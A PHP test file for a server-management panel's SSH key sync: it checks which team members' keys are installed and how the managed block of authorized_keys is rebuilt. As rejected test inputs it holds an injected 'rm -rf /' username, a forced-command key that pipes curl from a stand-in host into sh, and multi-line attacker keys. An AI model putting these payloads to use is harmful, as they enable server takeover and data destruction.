<?php

declare(strict_types=1);

use App\Enums\TeamRole;
use App\Exceptions\UnsafeNameException;
use App\Models\Application;
use App\Models\Server;
use App\Models\SshKey;
use App\Models\Team;
use App\Models\User;
use App\Services\Server\SecurityHardening;
use App\Services\SSH\SSHConnection;
use App\Services\Teams\TeamAccess;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Process;
use Illuminate\Support\Str;
use Tests\Support\FakeSSHTransport;

function userKeysTeamWith(array $roles): array
{
    $owner = User::factory()->create();
    $team = Team::factory()->create(['owner_id' => $owner->id]);
    $users = [];

    foreach ($roles as $name => $role) {
        $user = $role === TeamRole::Owner ? $owner : User::factory()->create();
        $team->members()->attach($user, ['role' => $role->value]);
        $users[$name] = $user;
    }

    return [$team, $users];
}

function userKeysAdd(User $user, string $publicKey): void
{
    SshKey::factory()->for($user)->create(['public_key' => $publicKey]);
}

function userKeysSandbox(?string $authorizedKeys = null): string
{
    $home = realpath(sys_get_temp_dir()) . '/coresmith-keys-' . Str::lower(Str::random(10));

    File::ensureDirectoryExists($home);

    if ($authorizedKeys !== null) {
        File::ensureDirectoryExists($home . '/.ssh');
        File::put($home . '/.ssh/authorized_keys', $authorizedKeys);
    }

    return $home;
}

function userKeysReconcile(string $home, array $keys): void
{
    $command = str_replace(
        ["'/home/deploy/", "'deploy:'"],
        ["'{$home}/", '"$(id -un):"'],
        (new SecurityHardening)->authorizedKeysSyncCommand('deploy', $keys),
    );

    Process::run(['bash', '-c', $command])->throw();
}

function userKeysLines(array $lines): string
{
    return implode("\n", $lines) . "\n";
}

test('the keys of owners and admins are installed, a deployer key is not', function () {
    [$team, $users] = userKeysTeamWith(['owner' => TeamRole::Owner, 'admin' => TeamRole::Admin, 'member' => TeamRole::Member]);

    userKeysAdd($users['owner'], 'ssh-ed25519 AAAAowner owner@laptop');
    userKeysAdd($users['admin'], 'ssh-ed25519 AAAAadmin admin@laptop');
    userKeysAdd($users['member'], 'ssh-ed25519 AAAAmember member@laptop');

    $keys = (new SecurityHardening)->userKeys(Server::factory()->for($team)->create());

    expect($keys)->toBe(['ssh-ed25519 AAAAowner owner@laptop', 'ssh-ed25519 AAAAadmin admin@laptop']);
});

test("a narrowed admin's key goes only on the servers shared with them, never with an app shared on its own", function () {
    [$team, $users] = userKeysTeamWith(['owner' => TeamRole::Owner, 'admin' => TeamRole::Admin]);
    $team->members()->updateExistingPivot($users['admin']->id, ['sees_everything' => false]);
    userKeysAdd($users['owner'], 'ssh-ed25519 AAAAowner owner@laptop');
    userKeysAdd($users['admin'], 'ssh-ed25519 AAAAadmin admin@laptop');
    $shared = Server::factory()->for($team)->create();
    $hidden = Server::factory()->for($team)->create();
    app(TeamAccess::class)->grant($team, $users['admin'], $shared);
    app(TeamAccess::class)->grant($team, $users['admin'], Application::factory()->for($team)->for($hidden)->create());

    expect((new SecurityHardening)->userKeys($shared))->toBe(['ssh-ed25519 AAAAowner owner@laptop', 'ssh-ed25519 AAAAadmin admin@laptop'])
        ->and((new SecurityHardening)->userKeys($hidden))->toBe(['ssh-ed25519 AAAAowner owner@laptop']);
});

test('a stored key that would add a second line to authorized_keys is never installed', function () {
    [$team, $users] = userKeysTeamWith(['owner' => TeamRole::Owner]);

    userKeysAdd($users['owner'], "ssh-ed25519 AAAAgood owner\nssh-ed25519 AAAAevil attacker");

    expect((new SecurityHardening)->userKeys(Server::factory()->for($team)->create()))->toBe([]);
});

test('the same key held twice is installed once', function () {
    [$team, $users] = userKeysTeamWith(['owner' => TeamRole::Owner, 'admin' => TeamRole::Admin]);

    userKeysAdd($users['owner'], 'ssh-ed25519 AAAAshared shared');
    userKeysAdd($users['admin'], 'ssh-ed25519 AAAAshared shared');

    expect((new SecurityHardening)->userKeys(Server::factory()->for($team)->create()))->toBe(['ssh-ed25519 AAAAshared shared']);
});

test('the sync command rebuilds only the managed block, in the ssh user home, through a temp file swapped into place', function (string $user, string $home) {
    $command = (new SecurityHardening)->authorizedKeysSyncCommand($user, ['ssh-ed25519 AAAAkey me@laptop', 'ssh-rsa AAAAother ops@bastion']);

    expect($command)->toStartWith("mkdir -p '{$home}/.ssh' && touch '{$home}/.ssh/authorized_keys' && tmp=\$(mktemp '{$home}/.ssh/authorized_keys.XXXXXX') && { awk -v start='# coresmith-managed-keys begin' -v stop='# coresmith-managed-keys end' ")
        ->and($command)->toContain("'{$home}/.ssh/authorized_keys' > \"\$tmp\" && printf '%s\\n' '# coresmith-managed-keys begin' 'ssh-ed25519 AAAAkey me@laptop' 'ssh-rsa AAAAother ops@bastion' '# coresmith-managed-keys end' >> \"\$tmp\"")
        ->and($command)->toContain("chmod 600 \"\$tmp\" && mv -f \"\$tmp\" '{$home}/.ssh/authorized_keys' || { rm -f \"\$tmp\"; false; }; }")
        ->and($command)->toEndWith("chmod 700 '{$home}/.ssh' && chown -R '{$user}:' '{$home}/.ssh'")
        ->and($command)->not->toContain('sudo')
        ->and($command)->not->toContain('grep');
})->with([
    'root' => ['root', '/root'],
    'a named user' => ['deploy', '/home/deploy'],
]);

test('with no keys left the sync command strips the block, writes none and leaves a missing file missing', function () {
    $command = (new SecurityHardening)->authorizedKeysSyncCommand('deploy', []);

    expect($command)->toStartWith("if [ -f '/home/deploy/.ssh/authorized_keys' ]; then tmp=\$(mktemp '/home/deploy/.ssh/authorized_keys.XXXXXX') && { awk ")
        ->and($command)->toContain("'/home/deploy/.ssh/authorized_keys' > \"\$tmp\" && chmod 600 \"\$tmp\"")
        ->and($command)->toEndWith("chown -R 'deploy:' '/home/deploy/.ssh'; fi")
        ->and($command)->not->toContain("printf '%s\\n'")
        ->and($command)->not->toContain('mkdir -p')
        ->and($command)->not->toContain('touch');
});

test('an ssh user that is not a linux username is refused before any command is built', function () {
    (new SecurityHardening)->authorizedKeysSyncCommand('deploy; rm -rf /', ['ssh-ed25519 AAAAkey me@laptop']);
})->throws(UnsafeNameException::class);

test('anything but a single line public key is refused before it can break out of the managed block', function (string $key) {
    (new SecurityHardening)->authorizedKeysSyncCommand('deploy', ['ssh-ed25519 AAAAgood me@laptop', $key]);
})->throws(InvalidArgumentException::class)->with([
    'a second line' => ["ssh-ed25519 AAAAgood me@laptop\nssh-ed25519 AAAAevil attacker"],
    'an early end marker' => ["ssh-ed25519 AAAAgood me@laptop\n# coresmith-managed-keys end"],
    'a bare marker' => ['# coresmith-managed-keys end'],
    'forced command options' => ['command="curl evil.test | sh" ssh-ed25519 AAAAevil attacker'],
    'nothing' => [''],
]);

test('reconciling replaces the managed block and leaves every other line alone', function () {
    $home = userKeysSandbox(userKeysLines([
        'ssh-ed25519 AAAAcoresmith coresmith@panel',
        '# coresmith-managed-keys begin',
        'ssh-ed25519 AAAAremoved gone@laptop',
        '# coresmith-managed-keys end',
        'ssh-rsa AAAAmanual ops@bastion',
    ]));

    try {
        userKeysReconcile($home, ['ssh-ed25519 AAAAkept me@laptop', "ssh-ed25519 AAAAquoted it's 100%s me"]);

        expect(File::get($home . '/.ssh/authorized_keys'))->toBe(userKeysLines([
            'ssh-ed25519 AAAAcoresmith coresmith@panel',
            'ssh-rsa AAAAmanual ops@bastion',
            '# coresmith-managed-keys begin',
            'ssh-ed25519 AAAAkept me@laptop',
            "ssh-ed25519 AAAAquoted it's 100%s me",
            '# coresmith-managed-keys end',
        ]))
            ->and(fileperms($home . '/.ssh/authorized_keys') & 0777)->toBe(0600)
            ->and(fileperms($home . '/.ssh') & 0777)->toBe(0700)
            ->and(array_map(fn($file): string => $file->getFilename(), File::files($home . '/.ssh', true)))->toBe(['authorized_keys']);
    } finally {
        File::deleteDirectory($home);
    }
});

test('reconciling with no keys left removes the block and adds nothing in its place', function () {
    $home = userKeysSandbox(userKeysLines([
        'ssh-ed25519 AAAAcoresmith coresmith@panel',
        '# coresmith-managed-keys begin',
        'ssh-ed25519 AAAAremoved gone@laptop',
        '# coresmith-managed-keys end',
    ]));

    try {
        userKeysReconcile($home, []);

        expect(File::get($home . '/.ssh/authorized_keys'))->toBe(userKeysLines(['ssh-ed25519 AAAAcoresmith coresmith@panel']));
    } finally {
        File::deleteDirectory($home);
    }
});

test('reconciling the same keys again leaves the file exactly as it was', function () {
    $home = userKeysSandbox('ssh-ed25519 AAAAcoresmith coresmith@panel');

    try {
        userKeysReconcile($home, ['ssh-ed25519 AAAAkept me@laptop']);
        $first = File::get($home . '/.ssh/authorized_keys');

        userKeysReconcile($home, ['ssh-ed25519 AAAAkept me@laptop']);

        expect(File::get($home . '/.ssh/authorized_keys'))->toBe($first)
            ->and($first)->toBe(userKeysLines([
                'ssh-ed25519 AAAAcoresmith coresmith@panel',
                '# coresmith-managed-keys begin',
                'ssh-ed25519 AAAAkept me@laptop',
                '# coresmith-managed-keys end',
            ]));
    } finally {
        File::deleteDirectory($home);
    }
});

test('a user with no authorized_keys gets one only when there are keys to write', function () {
    $empty = userKeysSandbox();
    $keyed = userKeysSandbox();

    try {
        userKeysReconcile($empty, []);
        userKeysReconcile($keyed, ['ssh-ed25519 AAAAkept me@laptop']);

        expect(file_exists($empty . '/.ssh/authorized_keys'))->toBeFalse()
            ->and(File::get($keyed . '/.ssh/authorized_keys'))->toBe(userKeysLines([
                '# coresmith-managed-keys begin',
                'ssh-ed25519 AAAAkept me@laptop',
                '# coresmith-managed-keys end',
            ]));
    } finally {
        File::deleteDirectory($empty);
        File::deleteDirectory($keyed);
    }
});

test('a begin marker with no end never takes the lines after it', function () {
    $home = userKeysSandbox(userKeysLines([
        '# coresmith-managed-keys begin',
        'ssh-ed25519 AAAAcoresmith coresmith@panel',
        '# coresmith-managed-keys begin',
        'ssh-ed25519 AAAAremoved gone@laptop',
        '# coresmith-managed-keys end',
        '# coresmith-managed-keys end',
        'ssh-rsa AAAAmanual ops@bastion',
        '# coresmith-managed-keys begin',
        'ssh-ed25519 AAAAafter someone@else',
    ]));

    try {
        userKeysReconcile($home, ['ssh-ed25519 AAAAkept me@laptop']);

        expect(File::get($home . '/.ssh/authorized_keys'))->toBe(userKeysLines([
            'ssh-ed25519 AAAAcoresmith coresmith@panel',
            'ssh-rsa AAAAmanual ops@bastion',
            'ssh-ed25519 AAAAafter someone@else',
            '# coresmith-managed-keys begin',
            'ssh-ed25519 AAAAkept me@laptop',
            '# coresmith-managed-keys end',
        ]));
    } finally {
        File::deleteDirectory($home);
    }
});

test('hardening installs the keys over ssh before it locks password login', function () {
    [$team, $users] = userKeysTeamWith(['owner' => TeamRole::Owner]);

    userKeysAdd($users['owner'], 'ssh-ed25519 AAAAowner owner@laptop');

    $server = Server::factory()->for($team)->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'ssh_user' => 'root']);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    $commands = $transport->commands();
    $install = array_key_first(array_filter($commands, fn(string $command): bool => str_contains($command, 'authorized_keys')));
    $reload = array_key_first(array_filter($commands, fn(string $command): bool => str_contains($command, 'sshd -t')));

    expect($install)->not->toBeNull()
        ->and($reload)->not->toBeNull()
        ->and($commands[$install])->toBe((new SecurityHardening)->authorizedKeysSyncCommand('root', ['ssh-ed25519 AAAAowner owner@laptop']))
        ->and($install)->toBeLessThan($reload);
});

test('hardening still clears the managed block when nobody who manages servers has a key', function () {
    [$team] = userKeysTeamWith(['owner' => TeamRole::Owner]);

    $server = Server::factory()->for($team)->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'ssh_user' => 'root']);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    $installs = array_values(array_filter($transport->commands(), fn(string $command): bool => str_contains($command, 'authorized_keys')));

    expect($installs)->toBe([(new SecurityHardening)->authorizedKeysSyncCommand('root', [])]);
});
